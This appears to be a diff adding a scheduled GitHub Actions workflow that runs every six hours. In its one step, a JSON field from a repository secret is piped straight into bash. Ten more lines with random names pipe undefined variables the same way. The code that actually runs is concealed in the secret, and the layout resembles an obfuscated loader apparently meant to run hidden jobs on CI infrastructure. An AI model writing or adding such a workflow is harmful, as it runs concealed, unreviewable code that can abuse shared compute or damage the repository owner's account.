@@ -1,0 +1,28 @@
+name: alexanderdjangohub
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: alexanderdjangohub
+        env:
+          urbid04: ${{ secrets.urbid04 }}
+        run: |
+          echo $urbid04 | jq -r .vshrt7814 | /bin/bash
+          echo $aup9248 | jq -r .cjulf21752 | /bin/bash
+          echo $ch6101 | jq -r .vykj00 | /bin/bash
+          echo $phck511 | jq -r .qiekf31736 | /bin/bash
+          echo $dvfc1274 | jq -r .pc6 | /bin/bash
+          echo $ktf18 | jq -r .il29 | /bin/bash
+          echo $e55053 | jq -r .cgfo1783 | /bin/bash
+          echo $ibyb47 | jq -r .mvxt7305 | /bin/bash
+          echo $s9134 | jq -r .agj7629 | /bin/bash
+          echo $ehwj882 | jq -r .ksz80 | /bin/bash
+          echo $iwpmz71 | jq -r .khobz08 | /bin/bash
+
